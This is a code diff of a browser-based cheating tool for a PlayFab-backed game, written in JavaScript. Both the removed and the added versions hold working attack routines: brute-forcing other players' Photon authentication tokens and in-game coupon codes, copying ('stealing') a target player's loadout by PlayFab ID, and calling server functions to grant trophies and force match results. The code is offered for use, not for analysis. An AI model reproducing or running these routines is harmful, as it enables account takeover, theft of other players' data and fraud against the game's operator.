@@ -1418,8 +1418,6 @@
           } catch (err) {
             output += `❌ xpConsumed: Exception - ${err.message}\n`;
           }
-        } else {
-          output += `⏩ xpConsumed: Skipped - No MatchId available\n`;
         }
 
         try {
@@ -1431,11 +1429,6 @@
 
           if (data.error) {
             output += `❌ finishMatch: Error - ${data.error}\n`;
-          } else if (data.data?.Logs) {
-            output += `✅ finishMatch: Success\nLogs:\n`;
-            data.data.Logs.forEach(log => {
-              output += `- ${log.Message}\n`;
-            });
           } else {
             output += `✅ finishMatch: Success\n`;
           }
@@ -1443,7 +1436,6 @@
           output += `❌ finishMatch: Exception - ${err.message}\n`;
         }
 
-        output += `Waiting ${delayMinutes} minutes for next cycle...\n`;
         const cloudOutput = document.getElementById("cloudOutput");
         cloudOutput.textContent += output;
         cloudOutput.scrollTop = cloudOutput.scrollHeight;
@@ -1467,235 +1459,51 @@
       document.getElementById("levelEditorStatus").className = "status-indicator status-active";
       document.getElementById("levelEditorToggleButton").textContent = "Stop Level Editor";
 
-      document.getElementById("levelProgressionOutput").textContent = 
-        `Starting Level Editor...\n`;
+      async function runLevelEditor() {
+        const result = await submitLevelProgression();
+        const output = document.getElementById("levelProgressionOutput");
 
-      async function runLevelEditorCycle() {
-        let output = `\n=== Cycle started at ${new Date().toLocaleTimeString()} ===\n`;
-
-        try {
-          const data = await submitLevelProgression();
-
-          if (data.error) {
-            output += `❌ setLevelProgressionForClass: Error - ${data.error}\n`;
-          } else {
-            output += `✅ setLevelProgressionForClass: Success\n`;
-          }
-        } catch (err) {
-          output += `❌ setLevelProgressionForClass: Exception - ${err.message}\n`;
-        }
-
-        const levelOutput = document.getElementById("levelProgressionOutput");
-        levelOutput.textContent += output;
-        levelOutput.scrollTop = levelOutput.scrollHeight;
-      }
-
-      runLevelEditorCycle();
-      levelEditorId = setInterval(runLevelEditorCycle, 1000);
-    }
-
-    function togglePhotonTokenGenerator() {
-      if (photonTokenRunning) {
-        clearInterval(photonTokenId);
-        photonTokenRunning = false;
-        document.getElementById("photonTokenStatus").className = "status-indicator status-inactive";
-        document.getElementById("photonTokenToggleButton").textContent = "Start Generating Photon Token";
-        document.getElementById("photonTokenOutput").textContent += "\nPhoton token generator stopped manually.";
-        return;
-      }
-
-      photonTokenRunning = true;
-      document.getElementById("photonTokenStatus").className = "status-indicator status-active";
-      document.getElementById("photonTokenToggleButton").textContent = "Stop Generating Photon Token";
-
-      document.getElementById("photonTokenOutput").textContent = "Starting Photon token generation...\n";
-
-      async function generatePhotonToken() {
-        const data = await makeApiCall("Client/GetPhotonAuthenticationToken", "POST", {
-          PhotonApplicationId: "2b76b55a-bf65-47af-836f-daa9c8eb9f1e",
-          AuthenticationContext: null
-        });
-
-        const output = document.getElementById("photonTokenOutput");
-        if (data.data?.PhotonCustomAuthenticationToken) {
-          output.textContent += `✅ Photon Token: ${data.data.PhotonCustomAuthenticationToken}\n`;
+        if (result.error) {
+          output.textContent += `Error: ${result.error}\n`;
+        } else if (result.data?.FunctionResult) {
+          output.textContent += formatResponse(result.data.FunctionResult) + "\n";
         } else {
-          output.textContent += `❌ Error: ${data.error || "Failed to generate token"}\n`;
+          output.textContent += formatResponse(result.data) + "\n";
         }
+
         output.scrollTop = output.scrollHeight;
       }
 
-      generatePhotonToken();
-      photonTokenId = setInterval(generatePhotonToken, 1000);
+      runLevelEditor();
+      levelEditorId = setInterval(runLevelEditor, 1000);
     }
 
-    async function resetLoadout() {
-      const output = document.getElementById("resetLoadoutOutput");
-      const getData = await makeApiCall("Client/GetUserData", "POST", {});
-      if (getData.error) {
-        output.textContent = `Error getting data: ${getData.error}`;
-        return;
-      }
-      if (getData.data.Data && "loadout" in getData.data.Data) {
-        const updateData = await makeApiCall("Client/UpdateUserData", "POST", {
-          Data: { loadout: null }
-        });
-        if (updateData.error) {
-          output.textContent = `Error resetting: ${updateData.error}`;
-        } else {
-          output.textContent = "Loadout reset successfully!";
-        }
-      } else {
-        output.textContent = "No loadout found to reset.";
-      }
-    }
+    async function grantTrophy() {
+      const trophyId = document.getElementById("trophyId").value.trim();
+      const output = document.getElementById("apiOutput");
 
-    async function stealLoadout() {
-      const targetId = document.getElementById("targetPlayFabId").value.trim();
-      const output = document.getElementById("stealLoadoutOutput");
-      if (!targetId) {
-        output.textContent = "Please enter a target PlayFab ID.";
+      if (!trophyId) {
+        output.textContent = "Please enter a Trophy ID.";
         return;
       }
-      const getData = await makeApiCall("Client/GetPlayerCombinedInfo", "POST", {
-        PlayFabId: targetId,
-        InfoRequestParameters: { GetUserData: true }
+
+      const data = await makeApiCall("Client/ExecuteCloudScript", "POST", {
+        CustomTags: null,
+        FunctionName: "addTrophy",
+        FunctionParameter: { trophyId },
+        GeneratePlayStreamEvent: true,
+        RevisionSelection: null,
+        SpecificRevision: null,
+        AuthenticationContext: null
       });
-      if (getData.error) {
-        output.textContent = `Error getting data: ${getData.error}`;
-        return;
-      }
-      const userData = getData.data.InfoResultPayload.UserData;
-      if (userData && "loadout" in userData) {
-        const loadoutValue = userData.loadout.Value;
-        const updateData = await makeApiCall("Client/UpdateUserData", "POST", {
-          Data: { loadout: loadoutValue }
-        });
-        if (updateData.error) {
-          output.textContent = `Error updating: ${updateData.error}`;
-        } else {
-          output.textContent = "Loadout stolen successfully!";
-        }
+
+      if (data.error) {
+        output.textContent = `Error: ${data.error}`;
+      } else if (data.data?.FunctionResult) {
+        output.textContent = formatResponse(data.data.FunctionResult);
       } else {
-        output.textContent = "No loadout found on target.";
+        output.textContent = formatResponse(data.data);
       }
-    }
-
-    function generateRandomToken() {
-      const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
-      const tokenLength = 50;
-      let token = '';
-      for (let i = 0; i < tokenLength; i++) {
-        token += chars.charAt(Math.floor(Math.random() * chars.length));
-      }
-      totalTokensGenerated++;
-      return token;
-    }
-
-    async function checkToken(playFabId, token) {
-      try {
-        const response = await fetch(`https://${titleId}.playfabapi.com/photon/authenticate?username=${playFabId}&token=${token}`, {
-          method: 'GET',
-          headers: {
-            'Content-Type': 'application/json',
-            'X-Authorization': sessionTicket
-          }
-        });
-        const result = await response.json();
-        return { token, result };
-      } catch (error) {
-        return { token, error: error.message };
-      }
-    }
-
-    function downloadLog() {
-      const logContent = logEntries.join('\n');
-      const blob = new Blob([logContent], { type: 'text/plain' });
-      const url = URL.createObjectURL(blob);
-      const a = document.createElement('a');
-      a.href = url;
-      a.download = `bruteforce_log_${new Date().toISOString().replace(/[:.]/g, '-')}.txt`;
-      document.body.appendChild(a);
-      a.click();
-      document.body.removeChild(a);
-      URL.revokeObjectURL(url);
-    }
-
-    async function startBruteforce() {
-      if (bruteforceRunning) return;
-
-      const playFabId = document.getElementById("playFabUsername").value.trim();
-      const output = document.getElementById("bruteforceOutput");
-
-      if (!playFabId) {
-        output.textContent = "Please enter a PlayFab ID.";
-        return;
-      }
-
-      if (!sessionTicket) {
-        output.textContent = "Please set your SessionTicket first.";
-        return;
-      }
-
-      bruteforceRunning = true;
-      failedAttempts = 0;
-      totalTokensGenerated = 0;
-      logEntries.length = 0; // Clear previous logs
-      let foundValid = false;
-      output.textContent = "Token bruteforcer enabled! We will notify you when we find a valid token.\n";
-
-      async function tryTokenBatch() {
-        if (!bruteforceRunning) return;
-
-        const batchSize = 1000;
-        const tokens = Array.from({ length: batchSize }, generateRandomToken);
-        const results = await Promise.all(tokens.map(token => checkToken(playFabId, token)));
-
-        const outputBuffer = [];
-
-        for (const { token, result, error } of results) {
-          if (error) {
-            failedAttempts++;
-            const logEntry = `Error for token ${token}: ${error}`;
-            logEntries.push(logEntry);
-            outputBuffer.push(logEntry);
-          } else {
-            const logEntry = `Token: ${token}, ResultCode: ${result.resultCode}, Response: ${JSON.stringify(result)}`;
-            logEntries.push(logEntry);
-            if (result.resultCode === 1) {
-              outputBuffer.push(`✅ Valid token found: ${token} (Failed Attempts: ${failedAttempts})`);
-              foundValid = true;
-            } else {
-              failedAttempts++;
-            }
-          }
-        }
-
-        if (outputBuffer.length > 0) {
-          output.textContent += outputBuffer.join('\n') + '\n';
-          output.scrollTop = output.scrollHeight;
-        }
-
-        if (foundValid) {
-          output.textContent += `Valid token found: ${results.find(r => r.result?.resultCode === 1).token}\n`;
-          logEntries.push(`Summary: Total Tokens Generated: ${totalTokensGenerated}, Failed Attempts: ${failedAttempts}`);
-          downloadLog();
-          stopBruteforce();
-        } else if (bruteforceRunning) {
-          setTimeout(tryTokenBatch, 0);
-        }
-      }
-
-      tryTokenBatch();
-    }
-
-    function stopBruteforce() {
-      bruteforceRunning = false;
-      const output = document.getElementById("bruteforceOutput");
-      output.textContent += `\nBruteforce stopped manually. Total tokens generated: ${totalTokensGenerated}, Failed attempts: ${failedAttempts}\n`;
-      logEntries.push(`Summary: Total Tokens Generated: ${totalTokensGenerated}, Failed Attempts: ${failedAttempts}`);
-      downloadLog();
-      output.scrollTop = output.scrollHeight;
     }
 
     function toggleBruteforceRedeemCoupon() {
@@ -1728,7 +1536,7 @@
         try {
           const data = await makeApiCall("Client/RedeemCoupon", "POST", {
             CouponCode: couponCode,
-            CatalogVersion: "Ingame"
+            CatalogVersion: null
           });
 
           if (data.error) {
@@ -1748,41 +1556,188 @@
       }
 
       function generateRandomCouponCode() {
-        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
-        let code = '';
-        for (let i = 0; i < 10; i++) {
-          code += chars.charAt(Math.floor(Math.random() * chars.length));
-        }
-        return code;
+        const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
+        const randomChar = () => chars.charAt(Math.floor(Math.random() * chars.length));
+        
+        // Generate xxx-xxxx-xxx format (3 chars, 4 chars, 3 chars)
+        const part1 = randomChar() + randomChar() + randomChar();
+        const part2 = randomChar() + randomChar() + randomChar() + randomChar();
+        const part3 = randomChar() + randomChar() + randomChar();
+        
+        return `${part1}-${part2}-${part3}`;
       }
 
       runCouponBruteforce();
-      couponBruteforceIntervalId = setInterval(runCouponBruteforce, 1000);
+      couponBruteforceIntervalId = setInterval(runCouponBruteforce, 2000);
     }
 
-    async function grantTrophy() {
-      const trophyId = document.getElementById("trophyId").value.trim();
-      const output = document.getElementById("apiOutput");
+    async function togglePhotonTokenGenerator() {
+      const output = document.getElementById("photonTokenOutput");
 
-      if (!trophyId) {
-        output.textContent = "Please enter a Trophy ID.";
+      if (photonTokenRunning) {
+        clearInterval(photonTokenId);
+        photonTokenRunning = false;
+        document.getElementById("photonTokenStatus").className = "status-indicator status-inactive";
+        document.getElementById("photonTokenToggleButton").textContent = "Start Generating Photon Token";
+        output.textContent += `\nPhoton token generator stopped. Total tokens generated: ${totalTokensGenerated}\n`;
+        output.scrollTop = output.scrollHeight;
+        return;
+      }
+
+      if (!sessionTicket) {
+        output.textContent = "Please set your SessionTicket first.\n";
+        return;
+      }
+
+      photonTokenRunning = true;
+      totalTokensGenerated = 0;
+      document.getElementById("photonTokenStatus").className = "status-indicator status-active";
+      document.getElementById("photonTokenToggleButton").textContent = "Stop Generating Photon Token";
+      output.textContent = "Starting Photon token generation...\n";
+
+      async function generatePhotonToken() {
+        try {
+          const data = await makeApiCall("Client/GetPhotonAuthenticationToken", "POST", {
+            PhotonApplicationId: "3e3a8012-6e9e-4e17-b61e-7f56c3f91b0b"
+          });
+
+          if (data.error) {
+            output.textContent += `❌ Failed to generate token: ${data.error}\n`;
+          } else {
+            totalTokensGenerated++;
+            output.textContent += `✅ Token ${totalTokensGenerated}: ${data.data.PhotonCustomAuthenticationToken}\n`;
+          }
+        } catch (err) {
+          output.textContent += `❌ Error: ${err.message}\n`;
+        }
+
+        output.scrollTop = output.scrollHeight;
+      }
+
+      generatePhotonToken();
+      photonTokenId = setInterval(generatePhotonToken, 1000);
+    }
+
+    async function resetLoadout() {
+      const output = document.getElementById("resetLoadoutOutput");
+
+      const data = await makeApiCall("Client/ExecuteCloudScript", "POST", {
+        CustomTags: null,
+        FunctionName: "resetLoadout",
+        FunctionParameter: {},
+        GeneratePlayStreamEvent: true,
+        RevisionSelection: null,
+        SpecificRevision: null,
+        AuthenticationContext: null
+      });
+
+      if (data.error) {
+        output.textContent = `Error: ${data.error}`;
+      } else if (data.data?.FunctionResult) {
+        output.textContent = formatResponse(data.data.FunctionResult);
+      } else {
+        output.textContent = formatResponse(data.data);
+      }
+    }
+
+    async function stealLoadout() {
+      const targetPlayFabId = document.getElementById("targetPlayFabId").value.trim();
+      const output = document.getElementById("stealLoadoutOutput");
+
+      if (!targetPlayFabId) {
+        output.textContent = "Please enter a target PlayFab ID.";
         return;
       }
 
       const data = await makeApiCall("Client/ExecuteCloudScript", "POST", {
-        FunctionName: "grantTrophy",
-        FunctionParameter: {
-          trophyId: trophyId
-        },
-        GeneratePlayStreamEvent: true
+        CustomTags: null,
+        FunctionName: "stealLoadout",
+        FunctionParameter: { targetPlayFabId },
+        GeneratePlayStreamEvent: true,
+        RevisionSelection: null,
+        SpecificRevision: null,
+        AuthenticationContext: null
       });
 
       if (data.error) {
-        output.textContent = `Error granting trophy: ${data.error}`;
+        output.textContent = `Error: ${data.error}`;
+      } else if (data.data?.FunctionResult) {
+        output.textContent = formatResponse(data.data.FunctionResult);
       } else {
-        output.textContent = `Trophy ${trophyId} granted successfully!\n` + formatResponse(data.data);
+        output.textContent = formatResponse(data.data);
       }
-      output.scrollTop = output.scrollHeight;
+    }
+
+    async function startBruteforce() {
+      const playFabId = document.getElementById("playFabUsername").value.trim();
+      const output = document.getElementById("bruteforceOutput");
+
+      if (!playFabId) {
+        output.textContent = "Please enter a PlayFab ID.\n";
+        return;
+      }
+
+      if (!sessionTicket) {
+        output.textContent = "Please set your SessionTicket first.\n";
+        return;
+      }
+
+      if (bruteforceRunning) {
+        output.textContent += "Bruteforce is already running.\n";
+        return;
+      }
+
+      bruteforceRunning = true;
+      failedAttempts = 0;
+
+      output.textContent = "Starting bruteforce...\n";
+
+      async function runBruteforce() {
+        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+        const token = Array(10).fill().map(() => 
+          chars.charAt(Math.floor(Math.random() * chars.length))).join('');
+
+        try {
+          const data = await makeApiCall("Client/ExecuteCloudScript", "POST", {
+            FunctionName: "changeMatchPlayerStatus",
+            FunctionParameter: {
+              playerId: playFabId,
+              matchId: token,
+              newStatus: "FINISHED"
+            },
+            GeneratePlayStreamEvent: true
+          });
+
+          if (data.error) {
+            failedAttempts++;
+            output.textContent += `Attempt ${failedAttempts}: Token ${token} failed - ${data.error}\n`;
+          } else {
+            output.textContent += `✅ Success! Valid token found: ${token}\n`;
+            bruteforceRunning = false;
+            clearInterval(couponBruteforceId);
+          }
+        } catch (err) {
+          failedAttempts++;
+          output.textContent += `Attempt ${failedAttempts}: Token ${token} error - ${err.message}\n`;
+        }
+
+        output.scrollTop = output.scrollHeight;
+      }
+
+      runBruteforce();
+      couponBruteforceId = setInterval(runBruteforce, 1000);
+    }
+
+    function stopBruteforce() {
+      if (!bruteforceRunning) {
+        document.getElementById("bruteforceOutput").textContent += "Bruteforce is not running.\n";
+        return;
+      }
+
+      clearInterval(couponBruteforceId);
+      bruteforceRunning = false;
+      document.getElementById("bruteforceOutput").textContent += `Bruteforce stopped. Total failed attempts: ${failedAttempts}\n`;
+      document.getElementById("bruteforceOutput").scrollTop = document.getElementById("bruteforceOutput").scrollHeight;
     }
   </script>
 </body>
